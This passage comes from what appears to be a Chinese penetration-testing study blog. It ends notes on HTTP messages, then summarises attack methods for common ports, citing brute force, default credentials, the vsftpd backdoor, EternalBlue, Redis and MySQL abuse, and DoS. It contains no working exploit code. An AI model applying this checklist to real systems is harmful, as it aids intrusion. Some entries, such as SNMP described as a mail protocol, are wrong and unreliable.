<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指名当前请求来自哪个站点</span><br><span class="line">存在csrf漏洞</span><br></pre></td></tr></table></figure>
<p>7）Referer</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先前网站的地址；当前请求网页紧跟其后</span><br></pre></td></tr></table></figure>
<h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><p>表示请求头结束，请求正文开始</p>
<h3 id="请求正文"><a href="#请求正文" class="headerlink" title="请求正文"></a>请求正文</h3><p>get方法提交数据时，数据参数会作为url的一部分，放在文件路径后面发送给服务器，称为查询字符串</p>
<h2 id="Responce："><a href="#Responce：" class="headerlink" title="Responce："></a>Responce：</h2><p>包含四个部分：状态行；消息报头；空行；响应正文；</p>
<h3 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP-Version Status-Code Reason-Phrase CRLF</span><br><span class="line"></span><br><span class="line">HTTP-Version：表示服务器HTTP协议的版本；</span><br><span class="line">Status-Code：表示服务器发回的响应状态代码；</span><br><span class="line">Reason-Phrase：表示状态代码的文本描述。</span><br></pre></td></tr></table></figure>
<p>包含五大状态码：</p>
<p>1xx：基本看不见。协议处理的中间状态</p>
<p>2xx：成功处理了客户端的请求</p>
<p>3xx：重定向 301；永久重定向  302；临时重定向 304；不具有跳转的含义；读取浏览器缓存</p>
<p>4xx：客户端发送的报文有误；403：禁止访问  404：访问不存在</p>
<p>5xx:服务器错误</p>
<h3 id="响应头部字段"><a href="#响应头部字段" class="headerlink" title="响应头部字段"></a>响应头部字段</h3><p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240522162932923.png" alt="image-20240522162932923"></p>
<h3 id="空行-1"><a href="#空行-1" class="headerlink" title="空行"></a>空行</h3><p>表示响应头结束，响应正文开始</p>
<h3 id="响应正文"><a href="#响应正文" class="headerlink" title="响应正文"></a>响应正文</h3><p>服务器返回的资源内容</p>
<blockquote>
<p>[!NOTE]</p>
<p>http和https区别：</p>
<p>https加入了ssl/tls安全协议，报文能够加密传输</p>
<p>http连接建立相对简单，</p>
<p>端口号不同80  、443</p>
<p>https需要向ca（证书权威机构）申请数字证书</p>
</blockquote>
]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>日记</tag>
        <tag>计算机网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透日记之端口利用</title>
    <url>/posts/e36ab591.html</url>
    <content><![CDATA[<h1 id="黑客常用端口利用总结"><a href="#黑客常用端口利用总结" class="headerlink" title="黑客常用端口利用总结"></a>黑客常用端口利用总结</h1><h2 id="常见端口渗透"><a href="#常见端口渗透" class="headerlink" title="# 常见端口渗透"></a><a href="https://edu.yijinglab.com/post/280#常见端口渗透">#</a> 常见端口渗透</h2><div class="table-container">
<table>
<thead>
<tr>
<th><strong>端口号</strong></th>
<th><strong>端口说明</strong></th>
<th style="text-align:left"><strong>攻击技巧</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>21/22/69</td>
<td>ftp/tftp：文件传输协议</td>
<td style="text-align:left">爆破、嗅探、溢出、后门</td>
</tr>
<tr>
<td>22</td>
<td>ssh：远程连接</td>
<td style="text-align:left">爆破、OpenSSH、28个退格</td>
</tr>
<tr>
<td>23</td>
<td>telnet：远程连接</td>
<td style="text-align:left">爆破、嗅探</td>
</tr>
<tr>
<td>25</td>
<td>smtp：邮件服务</td>
<td style="text-align:left">邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS：域名解析系统</td>
<td style="text-align:left">DNS区域传输、DNS劫持、DNS缓存投毒、DNS欺骗、深度利用（利用DNS隧道技术刺透防火墙）</td>
</tr>
<tr>
<td>67/68</td>
<td>dhcp：动态主机配置</td>
<td style="text-align:left">劫持、欺骗</td>
</tr>
<tr>
<td>110</td>
<td>pop3：邮件协议</td>
<td style="text-align:left">爆破</td>
</tr>
<tr>
<td>139</td>
<td>samba服务：linux系统应用Microsoft网络通讯协议的软件，<strong>用于Linux与windows系统直接的文件共享和打印共享</strong></td>
<td style="text-align:left">爆破、未授权访问、远程代码执行</td>
</tr>
<tr>
<td>143</td>
<td>lmap：交互式邮件存取协议</td>
<td style="text-align:left">爆破</td>
</tr>
<tr>
<td>161</td>
<td>snmp：简单邮件传输协议</td>
<td style="text-align:left">爆破</td>
</tr>
<tr>
<td>389</td>
<td>ldap：轻量目录访问</td>
<td style="text-align:left">注入攻击、未授权访问</td>
</tr>
<tr>
<td>445</td>
<td>smb：win 共享文件</td>
<td style="text-align:left">ms17-010/端口溢出</td>
</tr>
<tr>
<td>512/513/514</td>
<td>linux rexec服务</td>
<td style="text-align:left">直接使用rlogin</td>
</tr>
<tr>
<td>873</td>
<td>Rsync</td>
<td style="text-align:left">文件上传/未授权访问</td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td style="text-align:left">爆破（进行内网渗透）</td>
</tr>
<tr>
<td>1352</td>
<td>lotus domino邮件服务</td>
<td style="text-align:left">爆破（弱口令）、信息泄露（源代码）</td>
</tr>
<tr>
<td>1433</td>
<td>mssqlserver</td>
<td style="text-align:left">爆破（使用系统用户登陆）、注入攻击</td>
</tr>
<tr>
<td>1521</td>
<td>oracle</td>
<td style="text-align:left">爆破（TNS）、注入攻击</td>
</tr>
<tr>
<td>2049</td>
<td>nfs：linux文件共享</td>
<td style="text-align:left">配置不当</td>
</tr>
<tr>
<td>2181</td>
<td>zookeeper</td>
<td style="text-align:left">未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>mysql</td>
<td style="text-align:left">爆破、拒绝服务、注入</td>
</tr>
<tr>
<td>3389</td>
<td>Rdp远程桌面连接</td>
<td style="text-align:left">爆破、shift后门</td>
</tr>
<tr>
<td>4848</td>
<td>glassflsh控制台</td>
<td style="text-align:left">爆破（控制台弱口令）、认证绕过</td>
</tr>
<tr>
<td>5000</td>
<td>sybase/DB2数据库</td>
<td style="text-align:left">爆破、注入</td>
</tr>
<tr>
<td>5432</td>
<td>postgresql</td>
<td style="text-align:left">缓冲区溢出、注入攻击、爆破（弱口令）</td>
</tr>
<tr>
<td>5632</td>
<td>pcanywhere</td>
<td style="text-align:left">拒绝服务、代码执行</td>
</tr>
<tr>
<td>5900</td>
<td>vnc</td>
<td style="text-align:left">爆破（弱口令）、认证绕过</td>
</tr>
<tr>
<td>6379</td>
<td>redis</td>
<td style="text-align:left">未授权访问、爆破（弱口令）</td>
</tr>
<tr>
<td>7001/7002</td>
<td>weblogic</td>
<td style="text-align:left">java反序列化、控制台弱口令、控制台部署webshell</td>
</tr>
<tr>
<td>80/443/8080</td>
<td>web</td>
<td style="text-align:left">常见web攻击、控制台爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td>8069</td>
<td>zabbix</td>
<td style="text-align:left">远程命令执行</td>
</tr>
<tr>
<td>9090</td>
<td>websphere控制台</td>
<td style="text-align:left">爆破（控制台弱口令）、java反序列</td>
</tr>
<tr>
<td>9200/9300</td>
<td>elasticsearch</td>
<td style="text-align:left">远程代码执行</td>
</tr>
<tr>
<td>11211</td>
<td>memcache/memcached</td>
<td style="text-align:left">未授权访问</td>
</tr>
<tr>
<td>27017/27018</td>
<td>mongodb</td>
<td style="text-align:left">爆破、未授权访问</td>
</tr>
</tbody>
</table>
</div>
<h2 id="端口渗透剖析"><a href="#端口渗透剖析" class="headerlink" title="# 端口渗透剖析"></a><a href="https://edu.yijinglab.com/post/280#端口渗透剖析">#</a> 端口渗透剖析</h2><h3 id="21"><a href="#21" class="headerlink" title="# 21"></a><a href="https://edu.yijinglab.com/post/280#21">#</a> 21</h3><p>FTP通常用作对远程服务器进行管理，典型应用就是对web系统进行管理。一旦FTP密码泄露就直接威胁web系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透FTP服务器的几种方法。</p>
<p>（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。</p>
<p>（2) ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱</p>
<p>（3）后门vsftpd ：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取root权限。（<a href="https://www.freebuf.com/column/143480.html）">https://www.freebuf.com/column/143480.html）</a></p>
<p>（4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。</p>
<p>（5）ftp远程代码溢出。（<a href="https://blog.csdn.net/weixin_42214273/article/details/82892282）">https://blog.csdn.net/weixin_42214273/article/details/82892282）</a></p>
<p>（6）ftp跳转攻击。（<a href="https://blog.csdn.net/mgxcool/article/details/48249473）">https://blog.csdn.net/mgxcool/article/details/48249473）</a></p>
<h3 id="22"><a href="#22" class="headerlink" title="# 22"></a><a href="https://edu.yijinglab.com/post/280#22">#</a> 22</h3><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。</p>
<p>（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。</p>
<p>（2）防火墙SSH后门。（<a href="https://www.secpulse.com/archives/69093.html）">https://www.secpulse.com/archives/69093.html）</a></p>
<p>（3）28退格 OpenSSL</p>
<p>（4）openssh 用户枚举 CVE-2018-15473。（<a href="https://www.anquanke.com/post/id/157607）">https://www.anquanke.com/post/id/157607）</a></p>
<h3 id="23"><a href="#23" class="headerlink" title="# 23"></a><a href="https://edu.yijinglab.com/post/280#23">#</a> 23</h3><p>telnet是一种旧的远程管理方式，使用telnet工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。</p>
<p>（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。</p>
<p>（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。</p>
<h3 id="25-465"><a href="#25-465" class="headerlink" title="# 25/465"></a><a href="https://edu.yijinglab.com/post/280#25465">#</a> 25/465</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件</p>
<p>默认端口：25（smtp）、465（smtps）</p>
<p>（1）爆破：弱口令</p>
<p>（2）未授权访问</p>
<h3 id="53"><a href="#53" class="headerlink" title="# 53"></a><a href="https://edu.yijinglab.com/post/280#53">#</a> 53</h3><p>53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。</p>
<p>（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（<a href="https://www.seebug.org/vuldb/ssvid-96718）">https://www.seebug.org/vuldb/ssvid-96718）</a></p>
<p>（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（<a href="https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）">https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）</a></p>
<p>（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（<a href="http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）">http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）</a></p>
<p>（4）DNS劫持。（<a href="https://blog.csdn.net/qq_32447301/article/details/77542474）">https://blog.csdn.net/qq_32447301/article/details/77542474）</a></p>
<h3 id="80"><a href="#80" class="headerlink" title="# 80"></a><a href="https://edu.yijinglab.com/post/280#80">#</a> 80</h3><p>80端口通常提供web服务。目前黑客对80端口的攻击典型是采用SQL注入的攻击方法，脚本渗透技术也是一项综合性极高的web渗透技术，同时脚本渗透技术对80端口也构成严重的威胁。</p>
<p>（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。</p>
<p>（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。</p>
<p>（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。</p>
<p>（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。</p>
<p>（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。</p>
<p>（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。</p>
<p>（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。</p>
<h3 id="135"><a href="#135" class="headerlink" title="# 135"></a><a href="https://edu.yijinglab.com/post/280#135">#</a> 135</h3><p>135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’病毒就是利用这个漏洞进行传播的。对于135端口的渗透，黑客的渗透方法为:</p>
<p>（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。（<a href="https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）">https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）</a></p>
<p>（2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用hydra。对于telnet服务的开启可使用工具kali链接。（<a href="https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）">https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）</a></p>
<h3 id="139-445"><a href="#139-445" class="headerlink" title="# 139/445"></a><a href="https://edu.yijinglab.com/post/280#139445">#</a> 139/445</h3><p>139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。</p>
<p>（1）对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（<a href="https://blog.csdn.net/qq_41880069/article/details/82908131）">https://blog.csdn.net/qq_41880069/article/details/82908131）</a></p>
<p>（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（<a href="https://blog.csdn.net/god_7z1/article/details/6773652）">https://blog.csdn.net/god_7z1/article/details/6773652）</a></p>
<p>（3）对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（<a href="https://blog.warhut.cn/dmbj/145.html）">https://blog.warhut.cn/dmbj/145.html）</a></p>
<p>（4）对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。</p>
<h3 id="1433"><a href="#1433" class="headerlink" title="# 1433"></a><a href="https://edu.yijinglab.com/post/280#1433">#</a> 1433</h3><p>1433是SQLServer默认的端口，SQL Server服务使用两个端口：tcp-1433、UDP-1434.其中1433用于供SQLServer对外提供服务，1434用于向请求者返回SQLServer使用了哪些TCP/IP端口。1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。</p>
<p>（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（<a href="https://blog.csdn.net/gxj022/article/details/4593015）">https://blog.csdn.net/gxj022/article/details/4593015）</a></p>
<p>（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。（<a href="https://blog.csdn.net/kali_linux/article/details/50499576）">https://blog.csdn.net/kali_linux/article/details/50499576）</a></p>
<p>（3）嗅探技术同样能嗅探到SQL Server的登录密码。</p>
<p>（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。</p>
<h3 id="1521"><a href="#1521" class="headerlink" title="# 1521"></a><a href="https://edu.yijinglab.com/post/280#1521">#</a> 1521</h3><p>1521是大型数据库Oracle的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是Access，MSSQL以及MYSQL这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：</p>
<p>（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。</p>
<p>（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。</p>
<p>（3）在注入点直接创建java，执行系统命令。</p>
<p>（4）<a href="https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html">https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</a></p>
<h3 id="2049"><a href="#2049" class="headerlink" title="# 2049"></a><a href="https://edu.yijinglab.com/post/280#2049">#</a> 2049</h3><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。</p>
<p>未授权访问。（<a href="https://www.freebuf.com/articles/network/159468.html）">https://www.freebuf.com/articles/network/159468.html）</a> (<a href="http://www.secist.com/archives/6192.htm">http://www.secist.com/archives/6192.htm</a>)</p>
<h3 id="3306"><a href="#3306" class="headerlink" title="# 3306"></a><a href="https://edu.yijinglab.com/post/280#3306">#</a> 3306</h3><p>3306是MYSQL数据库默认的监听端口，通常部署在中型web系统中。在国内LAMP的配置是非常流行的，对于php+mysql构架的攻击也是属于比较热门的话题。mysql数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于3306端口的渗透，黑客的方法如下:</p>
<p>（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。</p>
<p>（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。</p>
<p>（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。</p>
<h3 id="3389"><a href="#3389" class="headerlink" title="# 3389"></a><a href="https://edu.yijinglab.com/post/280#3389">#</a> 3389</h3><p>3389是windows远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单。当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法漏洞’进行渗透。</p>
<p>（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。</p>
<p>（2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。</p>
<p>（3）Shift粘滞键后门：5次shift后门</p>
<p>（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。</p>
<p>（5）爆破3389端口。这里还是推荐使用hydra爆破工具。</p>
<p>（6）ms12_020死亡蓝屏攻击。（<a href="https://www.cnblogs.com/R-Hacker/p/9178066.html）">https://www.cnblogs.com/R-Hacker/p/9178066.html）</a></p>
<p>（7）<a href="https://www.cnblogs.com/backlion/p/9429738.html">https://www.cnblogs.com/backlion/p/9429738.html</a></p>
<h3 id="4899"><a href="#4899" class="headerlink" title="# 4899"></a><a href="https://edu.yijinglab.com/post/280#4899">#</a> 4899</h3><p>4899端口是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。radmini目前支持TCP/IP协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：</p>
<p>（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。</p>
<p>（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。</p>
<h3 id="5432"><a href="#5432" class="headerlink" title="# 5432"></a><a href="https://edu.yijinglab.com/post/280#5432">#</a> 5432</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
<p>（1）爆破：弱口令：postgres postgres</p>
<p>（2）缓冲区溢出：CVE-2014-2669。（<a href="http://drops.xmd5.com/static/drops/tips-6449.html）">http://drops.xmd5.com/static/drops/tips-6449.html）</a></p>
<p>（3）远程代码执行：CVE-2018-1058。（<a href="https://www.secpulse.com/archives/69153.html）">https://www.secpulse.com/archives/69153.html）</a></p>
<h3 id="5631"><a href="#5631" class="headerlink" title="# 5631"></a><a href="https://edu.yijinglab.com/post/280#5631">#</a> 5631</h3><p>5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意下载保存连接密码的*.cif文件，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个webshell。通常这些操作在黑客界被称为pcanywhere提权技术。</p>
<p>PcAnyWhere提权。<a href="https://blog.csdn.net/Fly_hps/article/details/80377199">https://blog.csdn.net/Fly_hps/article/details/80377199</a></p>
<h3 id="5900"><a href="#5900" class="headerlink" title="# 5900"></a><a href="https://edu.yijinglab.com/post/280#5900">#</a> 5900</h3><p>5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&amp;T的欧洲研究实验室开发的。VNC是在基于unix和linux操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和windows和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下：</p>
<p>（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。</p>
<p>（2）cain同样支持对VNC的嗅探，同时支持端口修改。</p>
<p>（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。</p>
<p>（4）VNC拒绝服务攻击（CVE-2015-5239）</p>
<p>（5）VNC权限提升（CVE-2013-6886）</p>
<h3 id="6379"><a href="#6379" class="headerlink" title="# 6379"></a><a href="https://edu.yijinglab.com/post/280#6379">#</a> 6379</h3><p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p>
<p>（1）爆破：弱口令</p>
<p>（2）未授权访问+配合ssh key提权。（<a href="http://www.alloyteam.com/2017/07/12910/）">http://www.alloyteam.com/2017/07/12910/）</a></p>
<h3 id="7001-7002"><a href="#7001-7002" class="headerlink" title="# 7001/7002"></a><a href="https://edu.yijinglab.com/post/280#70017002">#</a> 7001/7002</h3><p>7001/7002通常是weblogic中间件端口</p>
<p>（1）弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</p>
<p>（2）管理后台部署 war 后门</p>
<p>（3）SSRF</p>
<p>（4）反序列化漏洞</p>
<p>（5）weblogic_uac</p>
<blockquote>
<p><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p>
<p><a href="https://bbs.pediy.com/thread-224954.htm">https://bbs.pediy.com/thread-224954.htm</a></p>
<p><a href="https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</a></p>
<p><a href="https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</a></p>
</blockquote>
<h3 id="8080"><a href="#8080" class="headerlink" title="# 8080"></a><a href="https://edu.yijinglab.com/post/280#8080">#</a> 8080</h3><p>8080端口通常是apache_Tomcat服务器默认监听端口，apache是世界使用排名第一的web服务器。国内很多大型系统都是使用apache服务器，对于这种大型服务器的渗透，主要有以下方法：</p>
<p>（1）Tomcat远程代码执行漏洞 <a href="https://www.freebuf.com/column/159200.html">https://www.freebuf.com/column/159200.html</a></p>
<p>（2）Tomcat任意文件上传。<a href="http://liehu.tass.com.cn/archives/836">http://liehu.tass.com.cn/archives/836</a></p>
<p>（3）Tomcat远程代码执行&amp;信息泄露。<a href="https://paper.seebug.org/399/">https://paper.seebug.org/399/</a></p>
<p>（4）Jboss远程代码执行 <a href="http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</a></p>
<p>（5）Jboss反序列化漏洞。<a href="https://www.zybuluo.com/websec007/note/838374">https://www.zybuluo.com/websec007/note/838374</a></p>
<p>（6）Jboss漏洞利用。<a href="https://blog.csdn.net/u011215939/article/details/79141624">https://blog.csdn.net/u011215939/article/details/79141624</a></p>
<h3 id="27017"><a href="#27017" class="headerlink" title="# 27017"></a><a href="https://edu.yijinglab.com/post/280#27017">#</a> 27017</h3><p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似</p>
<p>（1）爆破：弱口令</p>
<p>（2）未授权访问；（<a href="http://www.cnblogs.com/LittleHann/p/6252421.html）">http://www.cnblogs.com/LittleHann/p/6252421.html）</a></p>
<p>（3）<a href="http://www.tiejiang.org/19157.html">http://www.tiejiang.org/19157.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rsync:rsync 是一个常用的 Linux 应用程序，用于文件同步。</span><br><span class="line">873端口</span><br><span class="line">它可以在本地计算机与远程计算机之间，或者两个本地目录之间同步文件（但不支持两台远程计算机之间的同步）。它也可以当作文件复制工具，替代cp和mv命令。</span><br><span class="line">它名称里面的r指的是 remote，rsync 其实就是&quot;远程同步&quot;（remote sync）的意思。与其他文件传输工具（如 FTP 或 scp）不同，rsync 的最大特点是会检查发送方和接收方已有的文件，仅传输有变动的部分（默认规则是文件大小或修改时间有变动）。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Socks5:sosks代理服务协议默认的服务端口号，用于监听传入的连接请求。 当一个客户端应用程序需要使用Sock5代理连接远程服务器时，它将会通过1080端口向代理服务器发送连接请求。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IBM Lotus Domino 是一款服务器产品，可提供企业级电子邮件、协作功能和自定义应用程序平台</span><br><span class="line">是一款由 IBM Software Group 开发并销售的协作式客户端-服务器应用程序</span><br><span class="line">1352端口</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zookeeper开放源码的分布式应用程序协同服务</span><br><span class="line">2181端口</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glassfish是一款web应用服务器，和tomcat一样，也是一款优秀的Servlet容器。</span><br><span class="line">端口4848</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pcanywhere：远程桌面连接</span><br><span class="line">5632端口</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vnc：虚拟网络控制台；远程控制工具</span><br><span class="line">端口5900</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zabbix：监控网络</span><br><span class="line">端口8069</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">websphere：中间件</span><br><span class="line">端口9090</span><br></pre></td></tr></table></figure>
